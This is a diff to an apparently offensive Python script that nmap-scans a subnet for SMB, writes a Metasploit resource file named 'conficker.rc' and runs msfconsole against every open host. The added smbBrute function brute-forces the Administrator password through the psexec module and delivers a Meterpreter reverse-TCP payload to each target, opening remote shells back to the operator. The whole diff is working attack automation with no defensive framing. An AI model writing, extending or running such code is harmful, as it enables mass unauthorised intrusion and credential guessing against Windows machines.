@@ -19,9 +19,24 @@ def exploitTgts(configfile,lhost,lport,rhost,rport):
         configFile.write("set RPORT " + rport + "\n")
         configFile.write("set payload windows/meterpreter/reverse_tcp\n")
 
+
+def smbBrute(configFile,pwlist,lhost,lport,rhost,rport):
+        pwds = pwlist.readlines()
+        username = "Administrator"
+        for p in pwds:
+                configFile.write('use exploit/windows/smb/psexec\n')
+                configFile.write('set SMBUser ' + username + '\n')
+                configFile.write('set SMBPass ' + p + '\n')
+                configFile.write('set RHOST ' + rhost + '\n')
+                configFile.write('set payload windows/meterpreter/reverse_tcp\n')
+                configFile.write('set LPORT ' + lport + '\n')
+                configFile.write('set LHOST ' + lhost + "\n")
+                configFile.write("exploit -j -z\n")
+        
 parser = argparse.ArgumentParser()
 parser.add_argument("remote",type=str,help="remote: x.x.x.x/subnet_mask")
 parser.add_argument("-l","--local",type=str,help="local: ip:port")
+parser.add_argument("-p","--passwords",type=str)
 args = parser.parse_args()
 
 if(not args.local):
@@ -46,6 +61,9 @@ if(len(remote)>1):
 else:
         rport = "445"
 
+pwlist = None
+if(args.passwords != None):
+        pwlist = open(args.passwords.strip(),"r")
 
 open_hosts = []
 nm.scan(hosts=rhosts,ports=rport)
@@ -60,7 +78,8 @@ try:
 
         for h in open_hosts:
                 exploitTgts(configFile,lhost=lhost,lport=lport,rhost = h,rport=rport)
-
+                if(pwlist != None):
+                        smbBrute(configFile,pwlist,lhost=lhost,lport=lport,rhost=h,rport=rport)
         configFile.close()
         os.system("msfconsole -r conficker.rc")
 except OSError as err:
